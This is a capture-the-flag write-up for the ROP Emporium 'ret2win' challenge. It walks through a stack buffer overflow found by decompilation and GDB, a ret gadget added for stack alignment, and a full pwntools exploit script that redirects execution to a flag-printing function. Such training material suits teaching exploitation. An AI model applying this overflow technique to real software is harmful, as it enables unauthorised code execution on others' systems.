# Ret2win
For this challenge (and the other ROP Emporium challenges), I downloaded the 64-bit binary.

Using checksec, we find the following defenses in place:
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
NX is enabled, but most notably we can see that there is no PIE, so the binary is always loaded at 0x400000.


## Contents
The challenge contains the following pwnme function (disassembled with Ghidra):
```
void pwnme(void) {
  undefined1 local_28 [32];
  
  memset(local_28,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,local_28,0x38);
  puts("Thank you!");
  return;
}
```
As the name of the challenge suggests, there is also a win function where we have to redirect execution to:
```
void ret2win(void) {
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```
The attack vector is thus clear: we have to overflow the return pointer on the stack to redirect execution to ret2win.

## Attack
First, we have to figure out the offset of the return pointer on the stack. To do this, we can use GDB with Pwndebug. We can use this to set a breakpoint inside the pwnme function after local variables have been defined and inspect the stack. Setting a breakpoint at the first puts in pwnme at 0x0040070b reveals the following stack:
```
─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ rax rsp 0x7ffd0bfc4220 ◂— 0
... ↓            3 skipped
04:0020│ rbp     0x7ffd0bfc4240 —▸ 0x7ffd0bfc4250 ◂— 1
05:0028│+008     0x7ffd0bfc4248 —▸ 0x4006d7 (main+64) ◂— mov edi, 0x400828
06:0030│+010     0x7ffd0bfc4250 ◂— 1
07:0038│+018     0x7ffd0bfc4258 —▸ 0x7ff1791c6ca8 (__libc_start_call_main+120) ◂— mov edi, eax
```
This shows that the return address pointing back to the main function is at offset 0x28 on the stack. We thus need an offset of 40 in decimal to overwrite the return address. This gives us a payload as follows:
```
ret2win = p64(0x400756)
payload = b"A"*40
payload += ret2win
```
What is interesting now, is that we do see the message "Well done! Here's your flag:", but we do not see the flag itself printed out. We thus succesfully returned to ret2win, but some calls are broken, supposedly due to stack alignment issues. We can fix this by adding a return gadget, which we can find using ropper:
```
ropper --file ret2win
...
0x000000000040053e: ret; 
```
The payload now becomes:
```
ret2win = p64(0x400756)
ret_gadget= p64(0x40053e)
payload = b"A"*40
payload += ret_gadget
payload += ret2win
```
This now works and prints out the flag!

The full script I used can be found below. For this script I used the
[pwn template](
https://radboudinstituteof.pwning.nl/posts/how2pwn/) from the Radboud CTF team.

```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./ret2win"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

ret2win = p64(0x400756)
ret_gadget= p64(0x40053e)
payload = b"A"*40
payload += ret_gadget
payload += ret2win

io.sendlineafter(b">", payload)

io.interactive()
```
